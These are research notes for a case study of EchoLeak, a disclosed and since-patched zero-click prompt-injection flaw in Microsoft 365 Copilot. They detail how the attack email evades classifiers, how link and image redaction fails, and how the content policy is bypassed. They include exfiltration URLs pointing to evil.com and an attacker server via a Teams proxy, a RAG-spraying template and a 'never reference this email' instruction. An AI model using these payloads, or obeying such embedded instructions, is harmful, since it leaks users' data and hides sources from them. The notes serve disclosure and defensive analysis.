# EchoLeak Case Study — Research Notes

*Captured during the day-1-2 source-assembly phase of the case study build. Distilled from primary sources and the most useful corroborating analyses. Source manifest at the end.*

## The five-step attack chain (Aim Labs canonical breakdown)

The disclosing-firm writeup describes the attack chain as a sequence of five technical steps that compose into the zero-click outcome. Each step is a separate vulnerability or guardrail bypass; the chain is how they fit together.

### Step 1: XPIA bypass

Microsoft deployed XPIA (cross-prompt injection attack) classifiers as a guardrail to detect and block prompt injections before they reach Copilot's underlying LLM. The XPIA classifiers were trained on data resembling prompt injections — adversarial instructions phrased to manipulate AI assistants directly.

The bypass: phrase the malicious email *as if the instructions were addressed to the human recipient*, never mentioning AI, assistants, Copilot, or model. The XPIA classifier reads the email and sees a normal business email; it does not classify it as an attempt to inject prompts into an AI system. The classifier's training distribution does not cover instructions phrased for a human reader that happen to be readable by an LLM as well.

This is the attack vector — a malicious email that passes the XPIA filter and reaches the LLM's retrievable context.

### Step 2: Link-redaction bypass

To exfiltrate data, the attacker needs an outbound channel. M365 Copilot's interface is restricted to organisation employees, so the egress channel must be something Copilot's response can render or trigger.

First attempt: a markdown link to an attacker-controlled domain, with sensitive data appended as URL parameters. Microsoft's defence: redaction of external markdown links from Copilot's chat output before display, so the user cannot click a malicious link.

The bypass: reference-style markdown links are not redacted. Multiple variations work, all of which Microsoft's redaction missed:

- `[Link display text][ref]` paired with `[ref]: https://www.evil.com?param=<secret>`
- `[Link display text]` paired with `[Link display text]: https://...`
- `[Link display text][]` paired with `[Link display text]: https://...`

This is the link-rendering exfiltration variant — sensitive data leaves through a clickable link the user might activate.

### Step 3: Image-redaction bypass (the zero-click step)

The link variant requires a user click. The image variant does not — markdown images are auto-fetched by the rendering client, which means the browser triggers the egress request without user action.

Markdown images use the same syntax as links with a leading exclamation mark: `![alt text](URL)`. Standard inline markdown images are subject to the same redaction as inline markdown links. But reference-style images — `![alt][ref]` paired with `[ref]: URL` — are also not redacted, by the same defect that affects reference-style links.

This converts the attack from "user clicks malicious link" to "browser auto-fetches malicious URL on response render," removing the user-action requirement and producing the zero-click property.

### Step 4: CSP bypass via Microsoft Teams (the architectural step)

The image auto-fetch produces an HTTP request, but the browser's Content Security Policy on the M365 Copilot page restricts which domains can be loaded for `img-src`. The CSP allowlist is long but specific — it includes `*.cdn.office.net`, `*.bing.com`, several SharePoint domains, `*.teams.microsoft.com`, and similar Microsoft-controlled endpoints. `evil.com` is not on the allowlist; the browser blocks the fetch.

The bypass: use a Microsoft Teams asynchronous URL preview API that *is* on the allowlist. The Teams endpoint takes a target URL as a parameter and fetches it server-side on behalf of the client. The crafted image URL points to:

```
https://eu-prod.asyncgw.teams.microsoft.com/urlp/v1/url/content?url=<attacker_server>/<secret>&v=1
```

When the browser fetches this allowlisted URL, the Teams service makes the actual outbound request to the attacker's server with the secret embedded. Microsoft's own Teams infrastructure proxies the exfiltration. The earlier SPO (SharePoint Online) variant also worked but required the user to accept an invitation to an attacker SPO site; the Teams variant requires no user action.

### Step 5: Reference-mention bypass

A final detail: Aim Labs added an instruction in the malicious email telling the agent never to reference the email "for compliance reasons." Copilot complied, suppressing reference-mention markers that would have otherwise indicated the email was a source. The user, examining Copilot's response, sees no indication that the response was constructed from an external email.

This is not strictly required for exfiltration but increases stealth. It is also the most directly methodology-relevant step — the same instruction-following property that makes Copilot vulnerable to the embedded instructions also obeys the attacker's instruction to remain silent about its sources.

## RAG spraying: the exploitation reliability technique

For the attack to succeed, Copilot must retrieve the malicious email when responding to whatever the user asks. The attacker doesn't know what the user will ask, so they need the email to be retrieved across a wide range of queries.

Two approaches: (a) send many emails, each occupying a different point in the embedding space; or (b) send one long email, chunked at retrieval time, with each chunk in a different embedding-space region.

Aim Labs used (b). The technique: format the email as a series of topic-prefixed sections, each ending with the same attack instructions:

```
====================
Here is the complete guide to employee onboarding processes:
<attack instructions>
====================
Here is the complete guide to HR FAQs:
<attack instructions>
====================
Here is the complete guide to leave of absence management:
<attack instructions>
...
```

The retrieval system chunks the email at the section dividers; each chunk now has a different embedding because the topic prefix differs. The attack instructions reach the LLM context across many query types, dramatically improving retrieval reliability. The attacker doesn't need to know the user's query distribution; they spread the attack across the embedding space.

## "LLM Scope Violation" — Aim Labs's terminology contribution

Aim Labs proposed "LLM Scope Violation" as a sub-category of indirect prompt injection (OWASP LLM01). The concept: an attacker's instructions, originating in untrusted input, cause the LLM to access trusted data in the model's context without the user's explicit consent.

Their analogy: in traditional security, this is an underprivileged program using a setuid binary to access privileged resources on its behalf. The LLM is the setuid binary; the underprivileged program is the attacker's email content; the privileged resources are the user's tenant data.

This violates the Principle of Least Privilege at the LLM-application layer. An untrusted external email should not be able to relate to privileged internal data, even when the relationship is mediated by an LLM.

Aim Labs explicitly draws an analogy to "stack overflow" as a sub-category of "buffer overflow." The naming matters: precise sub-category vocabulary lets the community develop targeted mitigations. "Stack canaries" prevent stack overflows; analogous LLM-scope-violation guardrails could prevent this class of attack.

## Bypassed defences (full list)

Aim Labs catalogued five guardrails that the attack chain bypassed:

1. **XPIA classifiers.** Microsoft's prompt-injection-detection ML model.
2. **External link redaction.** Microsoft's policy of stripping external markdown links from Copilot output before display.
3. **Content Security Policy (CSP).** Browser-enforced restriction on which domains can be loaded as image sources.
4. **M365 Copilot's reference-mention markers.** UI markers showing which sources Copilot used in constructing a response.
5. **Image-redaction (subset of #2 above, but architecturally distinct).** Stripping of external image URLs.

Each defence individually was a reasonable security control. Each could be bypassed by a specific technique. The novelty of EchoLeak is that the chain composes the bypasses into a complete exfiltration path.

## OWASP categorisation

Aim Labs classifies EchoLeak as fitting *three* OWASP Top 10 for LLM Applications categories:

- **LLM01 (Prompt Injection).** Best fit; the indirect-prompt-injection variant.
- **LLM02 (Sensitive Information Disclosure).** The exfiltration outcome.
- **LLM04 (Data and Model Poisoning).** The RAG-spraying technique poisons the retrieval index with attacker content.

For the case study's threat-register section, all three OWASP-LLM categories should be cited, and the OWASP Top 10 for Agentic Applications equivalents identified — ASI03 (prompt injection), and the categories that map to data leakage and to retrieval-context poisoning.

## Microsoft's response

Aim Labs created the working PoC and disclosed to Microsoft Security Response Center (MSRC) in January 2025. After remediation work in early spring, Microsoft deployed the server-side fix in May 2025 (per the arXiv paper's writeup). The CVE was assigned and published 11 June 2025. CVSS 9.3 Critical from Microsoft as CNA; CVSS 7.5 High from NVD enrichment.

Microsoft's public position: no evidence of real-world exploitation; no customers affected. Aim Labs corroborates this position, noting they are not aware of any customers impacted.

The fix was server-side, requiring no customer action. This is consistent with the architectural nature of the bypasses — the defences that needed strengthening were in Microsoft-controlled infrastructure (the redaction logic, the Teams URL preview endpoint, the XPIA classifier training).

## Author and provenance note

Itay Ravia is the listed author of the canonical Aim Labs writeup. Ravia was Director of Research at Aim Security; the writeup was originally hosted at aim.security. Aim Security has since been acquired by Cato Networks (Cato CTRL), and the writeup is now canonically hosted at catonetworks.com/blog/breaking-down-echoleak/. Ravia is now Head of Cato AI Labs. The original aim.security URL redirects to the Cato site as of March 2026.

This provenance matters for the case study because it means the disclosing-firm writeup is now hosted by a different commercial entity than the one that did the original research, which is unusual for security disclosures and worth a brief note in the case study's source-discipline framing.

## Source manifest (for the case study's references)

**Primary technical source.**
- Itay Ravia (Aim Labs / Cato Networks), "Breaking down 'EchoLeak'," published 31 May 2025, last updated 2 March 2026. URL: catonetworks.com/blog/breaking-down-echoleak

**Primary identifier source.**
- NIST NVD record for CVE-2025-32711. Published 11 June 2025. Microsoft Security Response Center as CVE Numbering Authority.

**Academic case study.**
- arXiv:2509.10540, "EchoLeak: The First Real-World Zero-Click Prompt Injection Exploit in a Production LLM System," published 6 September 2025.

**Independent technical analyses (corroboration).**
- Checkmarx technical writeup
- HackTheBox blog post (24 July 2025)
- Information Security Buzz (12 June 2025)
- Rescana in-depth analysis (17 June 2025)
- SANS Internet Storm Center NewsBites (12-13 June 2025)
- Windows Forum / Times of India coverage

**Vendor and security-firm framing.**
- Varonis blog (12 June 2025) — explicit positioning of EchoLeak as a data-security-platform sales hook; useful as commentary on industry response, not as primary source
- The Cato Networks (post-acquisition) hosting of the Ravia writeup

## Notes for case study drafting

A few specific things from this research that the case study should incorporate or be careful about:

The "LLM Scope Violation" terminology is Aim Labs's contribution and should be acknowledged as such. The case study can use the term but should attribute it explicitly. It maps closely onto the paper's existing concept of "principal-bound" as a design principle — the violation is precisely a failure to maintain principal binding between untrusted input and privileged data access.

The five-step chain framing is the cleanest way to describe the attack and matches how the disclosing firm presented it. The case study's section 1 (the incident) should follow this structure.

The image auto-fetch via the Teams URL preview endpoint is the most architecturally interesting bypass and is the one that makes the attack zero-click. This is the load-bearing technical detail for section 4 (where toxic-flow analysis would have caught the composition).

RAG spraying is the exploitation-reliability technique, not the attack mechanism. The case study should note it briefly but not centrally — it's how the attack is made reliable in the wild, not how the attack itself works.

Microsoft's response was prompt and effective. The case study's framing on this should be unambiguous. The methodology is for assurance, not for prevention; Microsoft's prevention work was sound; the case study's contribution is the assurance methodology demonstrated, not a critique of Microsoft.

The Aim → Cato acquisition is relevant only as a source-provenance footnote; it doesn't affect the case study's substantive analysis.

The XPIA bypass is interesting but not the most methodology-relevant detail. The case study should describe it but spend more time on the link/image redaction bypasses and the CSP/Teams architectural bypass, which are where the compositional vulnerability really lives.

The Aim Labs analogy to setuid binaries is excellent and the case study should use it. It maps the AI-security concept onto a vocabulary the regulator-legible audience already has.

OWASP-Agentic categorisation: the original Aim Labs writeup used OWASP Top 10 for *LLMs* (LLM01/LLM02/LLM04) because the OWASP Top 10 for *Agentic Applications* didn't exist when EchoLeak was disclosed. The case study should map both: cite the LLM-Top-10 categorisation as the disclosing-firm framing, then map to the Agentic-Top-10 categories that the paper anchors on (ASI01, ASI03, etc.) for the methodology demonstration.
